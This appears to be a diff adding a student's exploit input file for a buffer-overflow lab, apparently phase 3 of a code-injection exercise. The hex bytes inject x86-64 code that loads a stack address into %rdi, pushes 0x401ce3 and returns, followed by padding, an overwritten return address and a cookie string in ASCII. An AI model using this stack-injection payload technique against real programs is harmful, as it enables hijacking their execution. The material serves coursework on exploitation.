@@ -1,0 +1,8 @@
+48 c7 c7 c8 94 66 55 # movq $0x556694c8, %rdi, 0x556694c8 is return addr - 0x8(%rsp subq -> sub 0x8)
+68 e3 1c 40 00 # pushq $0x401ce3
+c3 # ret
+00 00 00
+00 00 00 00 00 00 00 00
+a8 94 66 55 00 00 00 00 # %rsp after subq
+33 32 30 34 36 33 30 31 00 #assci of cookie
+
